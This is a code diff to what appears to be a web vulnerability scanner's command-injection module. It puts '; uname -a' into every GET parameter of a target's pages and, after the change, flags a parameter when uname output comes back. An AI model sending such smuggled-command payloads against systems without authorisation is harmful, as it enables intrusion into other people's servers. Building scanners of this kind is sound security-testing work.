@@ -50,17 +50,17 @@ class SCIModule:
                 parsed_web_page = urlparse(web_page)
                 get_param_pages.add(parsed_web_page.path)
                 param_list = map(lambda x: x.split("="), parsed_web_page.query.split("&"))
-                original_response = get_request(web_page)
-                random_param_query = "?" + "&".join(map(lambda param: param[0] + "=" + urllib.quote("slkdfjsldk") ,param_list))
-                random_url = parsed_web_page.scheme + "://" + parsed_web_page.netloc + parsed_web_page.path + random_param_query
-                random_response = get_request(random_url)
-                malicious_params = []
+                # original_response = get_request(web_page)
+                # random_param_query = "?" + "&".join(map(lambda param: param[0] + "=" + urllib.quote("slkdfjsldk") ,param_list))
+                # random_url = parsed_web_page.scheme + "://" + parsed_web_page.netloc + parsed_web_page.path + random_param_query
+                # random_response = get_request(random_url)
                 malicious_params = []
                 for param in param_list:
                     malicious_params.append((param[0], "; uname -a"))
                 malicious_param_query = "?" + "&".join(map(lambda malicious_param: malicious_param[0] + "=" + urllib.quote(malicious_param[1]), malicious_params))
                 malicious_url = parsed_web_page.scheme  + "://" + parsed_web_page.netloc + parsed_web_page.path + malicious_param_query
                 malicious_response = get_request(malicious_url)
-                if malicious_response != original_response and malicious_response != random_response: # That means that the webpage is different, possibly a successful case
+                # if malicious_response != original_response and malicious_response != random_response: # That means that the webpage is different, possibly a successful case
+                if self.has_uname_content(malicious_response):
                     results.append((urlparse(web_page).path, create_get_params(malicious_url), "GET"))
         self.logs = log_results(self.url, results, EXPLOIT_CLASS)
